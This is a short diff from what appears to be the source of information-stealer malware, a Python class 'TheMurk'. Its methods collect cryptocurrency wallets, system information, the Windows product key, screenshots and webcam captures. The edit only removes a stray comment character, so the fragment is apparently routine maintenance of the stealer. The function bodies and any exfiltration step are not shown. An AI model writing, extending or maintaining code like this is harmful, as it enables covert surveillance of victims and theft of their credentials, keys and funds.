@@ -74,7 +74,7 @@ class TheMurk:
         self.msgInfo[1] += Wallets()
     
     def System(self):
-        self.msgInfo[0] = SystemInfo()#
+        self.msgInfo[0] = SystemInfo()
         ProductKey()
         Screenshot()
         WebCam()
